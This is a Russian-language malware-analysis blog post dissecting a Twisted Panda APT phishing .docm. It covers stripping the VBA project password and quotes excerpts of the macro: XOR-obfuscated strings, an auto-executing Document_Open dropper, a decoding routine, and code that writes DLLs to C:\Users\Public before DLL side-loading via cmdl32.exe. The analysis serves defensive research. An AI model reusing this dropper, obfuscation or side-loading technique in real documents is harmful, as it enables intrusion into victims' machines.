---
title:  "APT's Twisted Panda malware document analysis"
date:   2022-10-25 07:43:45 +0600
toc: true
header:
  teaser: "/assets/images/twisted_panda/twisted_panda_teser.jpg" ####->teaser
tags:
  - Phishing
  - DFIR
  - malware
  - RE
  - maldoc
---

## Вводная.

На недавнем SOC-форуме я уже рассказывал про данную APT группировку и показывал, хотя довольно поверхностно, разбор этого сэмпла. В этой статье, хотел бы разобрать его чуть подробнее.

Сэмпл, который мы будем разбирать от 2022-05-23, файл *.docm формата с Hash: 496b0b7f93a017b3e7931feac5c9ac1741d5081cfabafe19c14593093fd58c19, довольно подробный разбор бэкдора и вредоносных файлов описан в [отчёте CheckPoint](https://research.checkpoint.com/2022/twisted-panda-chinese-apt-espionage-operation-against-russians-state-owned-defense-institutes/), однако, там не разобрано вредоносное вложение *.docm ,которое использовалось в фишинговой кампании. Предлагаю исправить это досадное упущение.

Загрузим наш файл в REMnux и посмотрим на его формат (т.к. расширение не всегда соответствует формату файла), узнаем, есть ли шифрование, как например в файле стилера Loki в другой статье.

![1](/assets/images/twisted_panda/1.png){:class="img-responsive"}

На рисунке 1, с помощью утилиты file мы проверяем есть ли шифрование и какой формат есть у файла. Hex редактор xxd отображает нам верный для Microsoft Office файлов заголовок “PK”. Теперь мы можем приступить к исследованию файла с помощью [Oletools](https://github.com/decalage2/oletools) by Didier Stevens.

Выполнив oleid TwistedPanda.docm мы предварительно изучим, наличие в файле VBA, XLM макросов и внешних связей.

![2](/assets/images/twisted_panda/2.png){:class="img-responsive"}

Как мы можем заметить на рисунке 2 в файле есть VBA макросы. Давайте посмотрим на код и функции при помощи утилиты olevba3.

![3](/assets/images/twisted_panda/3.png){:class="img-responsive"}

У нас имеются 2 функции типа AutoExec, это означает, что код этих функций исполняется автоматически после открытия и нажатия кнопки "включить содержимое" и "разрешить редактирование", описание видно в “Description”.

Функции Chr, Xor, Hex Strings, Base64 Strings говорят нам о том, что в коде идёт преобразование, т.е. деобфускация во время исполнения.

Давайте изучим содержимое файла и VBA код.
После открытия файла мы получаем ошибку Document Error с опечаткой в слове «this». Ошибка с виду очень напоминает обыкновенную ошибку MS Word, но опечатка выдаёт с головой. (рисунок 4)

![4](/assets/images/twisted_panda/4.png){:class="img-responsive"}

При попытке добраться до содержимого проекта VBA нас встретит окно с паролем. Один из способов снятия пароля с VBA проекта уже описан в [статье с разбором Emotet](https://habr.com/ru/company/rvision/blog/699082/). Мы для разнообразия применим второй, не менее эффективный, способ снятия паролей с проектов VBA. Для этого docm разархивируем при помощи утилиты unzip (здесь также можно использовать oledump.py). Как показано на рисунке 5.

![5](/assets/images/twisted_panda/5.png){:class="img-responsive"}

Находим проект VBA и находим с помощью утилиты strings маркер наличие пароля который установлен при помощи «Project unviewable», подробнее про такую защиту можно почитать [здесь](https://habr.com/ru/post/514440/). И после меняем B на x, собираем всё в один документ и получает profit в виде доступа к VBA коду.

![6](/assets/images/twisted_panda/6.png){:class="img-responsive"}

После открытия проекта VBA вас встретит ошибка, её смело можно игнорировать и продолжить изучение VBA кода.

![7](/assets/images/twisted_panda/7.png){:class="img-responsive"}

На рисунке 8 видно, что в начале кода злоумышленники объявляют алиасы, к примеру:
zzz = LoadLibraryA();
zz = GetModuleHandleA();
FR = R1 (из библиотеки cmpbk64.dll или cmpbk32.dll);
crf = CreateFileA();
wtf = WriteFile();
и др.

![8](/assets/images/twisted_panda/8.png){:class="img-responsive"}

Помимо использования Windows API функций из библиотеки kernel32.dll, можно заметить, что проверяется разрядность, и в зависимости от архитектуры ОС, используется разный код. С чем это может быть связано?
В первую очередь с режимом ядра, т.к. весь код ядра ОС находится в одном адресном пространстве, и его разрядность соответствует разрядности ОС. При использовании RootKit’ов всегда проверяют разрядность.

Во вторую очередь, для внедрения в процесс, вредоносное ПО также должно быть в одном адресном пространстве с процессом, в который ему предстоит внедряться, т.к. процессор в этот момент выполняет инструкции в соответствие с разрядностью процесса. Иными словами, если исполняемый системный файл скомпилирован под архитектуру x32, то и вредоносный код, который будет внедряться в процесс, должен быть скомпилирован под такую же архитектуру.

Нас в коде очень интересует функция Document_Open(), т.к. она имеет тип AutoExec, и весь код выполняется после открытия файла, "включения содержимого" и "разрешения редактирования". Часть кода представлена на рисунке 9, давайте подробнее разбираться, что здесь к чему…

![9](/assets/images/twisted_panda/9.png){:class="img-responsive"}

Во-первых мы видим, что есть та самая генерация окна с ошибкой Document Error (MsgBox), которую мы уже наблюдали ранее (на рисунке 4), с опечаткой в слове «this». После объявления переменных идёт деобфускация (с помощью Xor и приведения к типу char) байткода и запись в переменные st, bb, cc, dd.

```vbnet
st = Chr(32 Xor CByte(99)) + Chr(83 Xor CByte(105)) + Chr(48 Xor CByte(108)) + Chr(55 Xor CByte(98)) + Chr(6 Xor CByte(117)) + Chr(53 Xor CByte(80)) + Chr(46 Xor CByte(92)) + Chr(0 Xor CByte(115)) + Chr(46 Xor CByte(114)) + Chr(53 Xor CByte(101)) + Chr(6 Xor CByte(115)) + Chr(55 Xor CByte(85)) + Chr(48 Xor CByte(92)) + Chr(83 Xor CByte(58)) + Chr(32 Xor CByte(67))
bb = Chr(15 Xor CByte(108)) + Chr(1 Xor CByte(108)) + Chr(20 Xor CByte(100)) + Chr(76 Xor CByte(46)) + Chr(89 Xor CByte(50)) + Chr(0 Xor CByte(51)) + Chr(89 Xor CByte(107)) + Chr(76 Xor CByte(98)) + Chr(20 Xor CByte(112)) + Chr(1 Xor CByte(109)) + Chr(15 Xor CByte(99))
cc = Chr(73) + Chr(78) + Chr(73) + Chr(84)
dd = Chr(15 Xor CByte(108)) + Chr(1 Xor CByte(108)) + Chr(20 Xor CByte(100)) + Chr(76 Xor CByte(46)) + Chr(95 Xor CByte(52)) + Chr(0 Xor CByte(54)) + Chr(95 Xor CByte(107)) + Chr(76 Xor CByte(98)) + Chr(20 Xor CByte(112)) + Chr(1 Xor CByte(109)) + Chr(15 Xor CByte(99))
```

В итоге получаем следующие данные:
st = C:\Users\Public;
bb = cmpbk32.dll;
dd = cmpbk64.dll;
cc = INIT.

Здесь C:\Users\Public – директория куда будут дропаться вредоносные файлы cmpbk32.dll и INIT или cmpbk64.dll и INIT (зависит от архитектуры). Далее в функции идёт следующий код:

```vbnet
#If Win64 Then
    
    Dim hd As LongPtr
    hd = zz(dd)
    If Not hd = 0 Then
        zzzz (hd)
    Else
        wafll st + "\" + dd, accef34Decode(UserForm1.Label2), CByte(73), 1
        h = zzz(st & "\" + dd)
        FR
    End If
    
    #Else
    
    Dim hd As Long
    hd = zz(bb)
    If Not hd = 0 Then
        zzzz (hd)
    Else
        h = zzz(st & "\" + bb)
        FR
    End If
#End If
```

Зная значения переменных и алиасов мы можем «причесать» код:

```vbnet
#If Win64 Then
    

    Dim hd As LongPtr
    hd = GetModuleHandleA(cmpbk64.dll)
    If Not hd = 0 Then
        FreeLibrary(hd)
    Else
        wafll C:\Users\Public + "\" + cmpbk64.dll, accef34Decode(UserForm1.Label2), CByte(73), 1
        h = FreeLibrary(C:\Users\Public & "\" + cmpbk64.dll)
        R1
    End If
    
    
    #Else
    
    Dim hd As Long
    hd = GetModuleHandleA(cmpbk32.dll)
    If Not hd = 0 Then
        FreeLibrary(hd)
    Else
        h = LoadLibraryA(C:\Users\Public & "\" + cmpbk32.dll)
        R1
    End If
#End If
```

Теперь мы видим, какие функции и для чего используются, какие имена файлов и какие директории задействуются. Не изученными остались функции для деобфускации байткода (две из них в строке 9 листинге кода выше). За деобфускацию байт-кода и создание вредоносных файлов отвечают функции accef34Decode() и wafll().

Весь байт-код вложен в UserForms, на рисунке 10 часть байт-кода (красным выделен байт код для cmpbk64.dll & INIT, т.е. архитектуры x64).

![10](/assets/images/twisted_panda/10.png){:class="img-responsive"}

В функции accef34Decode() на вход подаётся строка, которая проходит дефобфускацию через обыкновенные replace():

```vbnet
Function accef34Decode(accef34String As String) As String
  ...
  accef34String = Replace(accef34String, vbCrLf, "")
  accef34String = Replace(accef34String, vbTab, "")
  accef34String = Replace(accef34String, " ", "")

  dataLength = Len(accef34String)
    If dataLength Mod 4 <> 0 Then
      Exit Function
    End If
  ...
    For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

      For CharCounter = 0 To 3
        thisChar = Mid(accef34String, groupBegin + CharCounter, 1)
  ...
  accef34Decode = sOut
```

После чего, сверяется длина строки, необходимо, чтобы строка делилась на 4 без остатка. Далее у нас есть 2 вложенных цикла, в первом чанками по 4 символа идёт перебор, во втором каждый символ из чанка приводится к нужному формату через функции mid, left и др. В конечном итоге на выходе функции мы получаем строку accef34Decode, которая прошла один из этапов деобфускации.
Эта строка вместе с параметрами: полный путь до файла **(C:\Users\Public\cmpbk32.dll)**, деобфусцированной строкой из предыдущей функции **accef34Decode()**, солью (потребуется для XOR) и смещением, передаётся в функцию **wafll()**.

```vbnet
Private Sub wafll(ByVal st As String, ByVal d As String, salt As Byte, offset As Long)

    Dim s11() As Byte
    s11 = StrConv(d, vbFromUnicode)
    For j = 4 To UBound(s11)
        s11(j) = s11(j) Xor salt
    Next j
    
    h = crf(st, &H40000000, 0, 0, 2, 0, 0)
    r = wtf(h, s11(0 + offset), Len(d), bb2, 0)
    clf (h)
End Sub
```

В функции **wafll()** происходит ещё один этап деобфускации и приведения типа string в Byte, а после дроп файлов на хост.
**s11 = StrConv(d, vbFromUnicode)** - здесь строка преобразуется из Unicode. После чего идёт цикл с элемента по индексу 4 до верхней границы массива, в этом цикле с каждым элементом производится операция XOR с солью, для файла cmdl32.dll salt = Cbyte(79), для файла **cmdl64.dll salt = CByte(73) и для INIT salt = CByte(0)**.
Итого, после открытия документа вредоносные файлы cmdl32.dll & INIT (зависит от разрядности ОС) создаются с помощью функции crf, например:

**CreateFileA("C:\Users\Public\cmpbk32.dll", GENERIC_WRITE, 0 , 0, 2, 0 ,0)**
И в данный файл записывается весь деобфусцированный байт-код следующей Win API функцией WriteFileA().
На рисунке 11 можно заметить вредоносные файлы, которые создаются после открытия вредоносного документа.

![11](/assets/images/twisted_panda/11.png){:class="img-responsive"}

В конце отрабатывает следующий код (привёл к читаемому виду):

```vbnet
Dim hd As LongPtr
    hd = GetModuleHandleA(cmpbk32.dll)
    If Not hd = 0 Then
        FreeLibrary(hd)
    Else
        wafll C:\Users\Public + "\" + cmpbk64.dll, accef34Decode(UserForm1.Label2), CByte(73), 1
        h = FreeLibrary(C:\Users\Public & "\" + cmpbk64.dll)
        R1
    End If
```

Который загружает вредоносную библиотеку и вызывает из неё функцию **R1** (экспортируется из вредоносной библиотеки **cmpbk32.dll**).

![12](/assets/images/twisted_panda/12.png){:class="img-responsive"}

Функция **R1** отвечает за создание в директории пользователя **%Temp%** папки **OfficeInit** и перемещение дропнутых файлов туда, также туда перемещается cmdl32.exe (легитимный исполняемый файл из директории system32), после чего легитимный процесс запускается он подгружает вредоносный код из библиотеки **cmpbk32.dll**. Т.е. реализуется атака side-on loading DLL для обхода СЗИ. (рис 13)

![13](/assets/images/twisted_panda/13.png){:class="img-responsive"}

Дальнейший анализ библиотеки и файла INIT можно увидеть в [отчёте CheckPoint](https://research.checkpoint.com/2022/twisted-panda-chinese-apt-espionage-operation-against-russians-state-owned-defense-institutes/).

В статье мы разобрали вредоносный документ, который группировка использовала в своих фишинговых атаках, изучили VBA код и методы обфускации и деобфускации. А также увидели один из способов доставки вредоносных файлов на хост (без доступа к сети интернет).

Надеюсь статья получилась интересной и главное полезной.
